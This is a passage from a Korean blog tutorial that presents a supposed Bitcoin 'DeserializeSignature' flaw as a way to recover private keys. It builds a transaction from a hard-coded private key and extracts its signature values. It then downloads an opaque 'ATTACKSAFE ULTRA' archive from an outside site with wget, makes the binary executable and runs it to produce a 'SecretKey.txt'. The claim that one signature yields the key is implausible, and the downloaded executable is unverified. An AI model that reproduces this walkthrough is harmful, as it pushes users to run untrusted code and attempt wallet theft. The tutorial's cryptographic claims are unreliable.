<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:heading -->
<h2 class="wp-block-heading">실용적인 부분</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener">실제적인 부분으로 넘어가기 위해 Broadcast Bitcoin Transaction</a></strong>&nbsp;저장소를 사용하여&nbsp;수신된 데이터로부터 취약한&nbsp;<strong>원시 트랜잭션을 생성해 보겠습니다.</strong><strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>소스 코드를 다운로드하여 설치하고 터미널을 열고 다음 명령을 실행하십시오.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>git clone https://github.com/smartiden/Broadcast-Bitcoin-Transaction.git
</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>목록:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cd Broadcast-Bitcoin-Transaction</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>세 가지 중요한 라이브러리를 설치해 보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li><a href="https://pypi.org/project/zmq/" target="_blank" rel="noreferrer noopener"><strong>zmq</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/urllib3/" target="_blank" rel="noreferrer noopener"><strong>urllib3</strong></a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><a href="https://pypi.org/project/requests/" target="_blank" rel="noreferrer noopener"><strong>요청</strong></a></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:image {"id":4733,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/04/image-8-1024x495.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-4733"/><figcaption class="wp-element-caption"><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/requirements.txt" target="_blank" rel="noreferrer noopener"><strong>요구사항.txt</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>다음 명령을 실행해 보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>pip install -r requirements.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/" target="_blank" rel="noreferrer noopener">Notepad&nbsp;</a><a href="https://keyhunters.ru/the-benefits-of-the-popular-notepad-program/">++</a>&nbsp;에서 메인 파일을 열고 Python 스크립트 코드&nbsp;<strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/main.py" target="_blank" rel="noreferrer noopener">main.py</a></strong>&nbsp;를 약간 변경해 보겠습니다.<strong><a href="https://github.com/smartiden/Broadcast-Bitcoin-Transaction/blob/main/main.py" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>from io import BytesIO
from secp256k1 import *
from sighash import *

pk = PrivateKey.parse("5HrVy4SVvC46tsuBhMhVEGHXG4AzhxtEqi4FLbia5vAXuF5GwaX")
pk.address()
tx = bytes.fromhex("35591e5c7f4f1f0e4d81748042f2a4b7dcae3ae01027f361cad7c8746369bc0d")
index = 0
send = "1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk"
tx_in = TxIn(tx, index, b'', 0xffffffff)
tx_in._script_pubkey = Tx.get_address_data(pk.address())&#91;'script_pubkey']
tx_in._value = 2345
tx_ins = &#91; tx_in ]
tx_outs = &#91;
    TxOut(1234, Tx.get_address_data(send)&#91;'script_pubkey'].serialize())
]
tx = Tx(1, tx_ins, tx_outs, 0, testnet=True)
signature(tx, 0, pk)
tx.serialize().hex()
print(tx.serialize().hex())
f = open("RawTX.txt", 'w')
f.write("" + tx.serialize().hex() + "" + "\n")
f.close()</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>다음 명령을 실행해 보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>python main.py</strong></code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>취약한 거래가 생성되었습니다!</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>디렉터리에서 RawTX 파일을 열어 보겠습니다.</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">영상 속 동작 순서:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph {"align":"center"} -->
<p class="has-text-align-center"><iframe width="560" height="315" src="https://www.youtube.com/embed/is1oUSCFJms?si=IKFpmucNzE-EoYO7" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen=""></iframe></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><em><a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener"><strong>BitcoinChatGPT</strong></a>&nbsp;모듈 의&nbsp;<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener">신속한 응답을</a>&nbsp;통해 알 수 있듯이&nbsp;<strong><a href="https://github.com/BitcoinChatGPT/DeserializeSignature-Vulnerability-Algorithm" target="_blank" rel="noreferrer noopener">DeserializeSignature</a></strong>&nbsp;취약점을 식별하는 알고리즘은&nbsp;<a href="https://colab.research.google.com/drive/1-3WyUqipb1pXrlDjg4jxtMOG6J3MU3sa" target="_blank" rel="noreferrer noopener"><strong></strong></a><strong><a href="https://github.com/BitcoinChatGPT/DeserializeSignature-Vulnerability-Algorithm" target="_blank" rel="noreferrer noopener"></a></strong></em><em>복잡한 암호화 문제를&nbsp;</em><em>해결하기 위한</em><em>&nbsp;여러 옵션에 사용될 수 있습니다 .</em><em></em></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://keyhunters.ru/nonce-bitcoin/" target="_blank" rel="noreferrer noopener">비트코인 블록체인에서 개인 키 "K"(NONCE) 공개</a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5306,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-42-1024x495.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5306"/></a></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo">https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener">[GoogleColab]을</a></strong>&nbsp;열어 보겠습니다.&nbsp;<strong><a href="https://colab.research.google.com/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener"><strong>32DeserializeSignatureVulnerability</strong></a>&nbsp;저장소를 사용하여 알고리즘을 구현해 보겠습니다.<a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/32DeserializeSignatureVulnerability/

ls</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5200} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-12-1024x660.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5200"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">공격에 대비한 RawTX를 준비하자</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"></h2>
<!-- /wp:heading -->

<!-- wp:heading -->
<h2 class="wp-block-heading">이제 모든 취약한 트랜잭션에서 전체 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>서비스를 사용해 봅시다:&nbsp;<a href="https://attacksafe.ru/RSZ-Signature-From-Tx" target="_blank" rel="noreferrer noopener"><strong>https://attacksafe.ru/RSZ-Signature-From-Tx</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5152,"linkDestination":"custom"} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-10-1024x429.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5152"/><figcaption class="wp-element-caption"><a href="https://attacksafe.ru/RSZ-Signature-From-Tx" target="_blank" rel="noreferrer noopener"><strong>RSZ-서명-From-Tx</strong></a></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">공격을 구현하고 비밀 키를 얻기 위해 “ATTACKSAFE ULTRA”</a></strong><strong>&nbsp;소프트웨어를 사용합니다.</strong><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":5137,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-ultra.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5137"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/ultra</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">"ATTAKSAFE ULTRA"</a>&nbsp;소프트웨어를 실행하는 데 필요한 라이브러리 패키지의 경우&nbsp;<a href="https://cryptodeeptech.ru/install-sagemath-in-google-colab" target="_blank" rel="noreferrer noopener">"SAGE MATH"를</a>&nbsp;설치하십시오 .<a href="https://cryptodeeptech.ru/install-sagemath-in-google-colab" target="_blank" rel="noreferrer noopener"></a></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":2188} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-27.png" alt="Twist Attack 예시 1. 비트코인 ​​지갑의 개인 키 값을 얻기 위해 일련의 ECC 작업을 수행합니다." class="wp-image-2188"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":2189} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2023/01/image-28-1024x445.png" alt="Twist Attack 예시 1. 비트코인 ​​지갑의 개인 키 값을 얻기 위해 일련의 ECC 작업을 수행합니다." class="wp-image-2189"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">설치 명령:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sudo apt-get update
!sudo apt-get install -y python3-gmpy2
!sudo apt-get install sagemath</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5205} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-13-1024x442.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5205"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!sage -v</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5207} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-14.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5207"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://keyhunters.ru/what-is-wget/" target="_blank" rel="noreferrer noopener"><strong>wget</strong>&nbsp;</a>유틸리티를 사용하여&nbsp;<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener">ATTACKSAFE_ULTRA.zip</a></strong>&nbsp;저장소를&nbsp;<strong><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener">Google Colab</a></strong>&nbsp;폴더 에 다운로드합니다.<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!wget https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5208} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-15-1024x283.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5208"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener">ATTACKSAFE_ULTRA.zip</a></strong>&nbsp;저장소의 압축을 풉니다.<strong><a href="https://attacksafe.ru/REPOSITORY/DC66398E76DBCD8193134381D7838A02/ATTACKSAFE_ULTRA.zip" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!unzip ATTACKSAFE_ULTRA.zip</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5209} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-16-1024x440.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5209"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ls</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5213} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-17-1024x768.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5213"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5215} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-18-1024x528.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5215"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5216} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-19-1024x537.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5216"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5217} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-20-1024x526.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5217"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5218} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-21-1024x414.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5218"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -help</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5221} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-22.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5221"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -version</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5224} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-24.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5224"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">모든 공격 스크립트 목록을 실행해 보겠습니다.</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe -ultra</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5238} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-25-1024x706-SAVE.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5238"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5231} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-27-1024x768.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5231"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5234} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-28-1024x750.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5234"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5237} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-29-1024x771.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5237"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">액세스 권한:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!chmod +x attacksafe</strong></code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ls -l</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5239} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-30-1024x436.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5239"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">애플리케이션:</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>선택하자<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>취약한 ECDSA</strong>&nbsp;서명 트랜잭션 에서 비밀 키를 얻으려면&nbsp;데이터를 텍스트 문서에 추가 하고&nbsp;이를 위해&nbsp;&nbsp;<strong><code>RawTX</code>&nbsp;</strong>파일로 저장합니다.<code><strong>RawTX.txt</strong></code><code>echo</code></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><em><strong>다음 명령을 실행해 보겠습니다.</strong></em></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!echo '01000000010dbc696374c8d7ca61f32710e03aaedcb7a4f2428074814d0e1f4f7f5c1e5935000000008b483045022100b44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307022074e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f0141045cf7dd1ad49af6957415d6b76ff39cbf78f6e72f1db9199a01127687e7230f96614ff6f0184d2191fa7428872e311fe4ddf2b91f560b30fd7dc01d2118ac0b5bffffffff01d2040000000000001976a914d74b32dfa340da479ce64aaf5e326496eb3995f188ac00000000' &gt; RawTX.txt
!cat RawTX.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5241} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-32-1024x261.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5241"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading"><code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code>소프트웨어를 사용하여&nbsp;시작하자<code>“ATTACKSAFE&nbsp;ULTRA”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>!./attacksafe deserialization_error_vulnerability_cve-2023-0085.sage -open RawTX.txt -save SecretKey.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5242} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-33-1024x435.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5242"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code><strong>deserialization_error_vulnerability_cve-2023-0085.sage</strong></code>그 결과는 파일에 저장되었습니다.<code><strong>SecretKey.txt</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code><strong>SecretKey.txt</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>cat SecretKey.txt</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5243} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-34-1024x223.png" alt="비트코인 네트워크의 DeserializeSignature 취약성: 암호화 분석, 결과 및 잘못된 ECDSA 서명 생성 가능성" class="wp-image-5243"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5244} -->
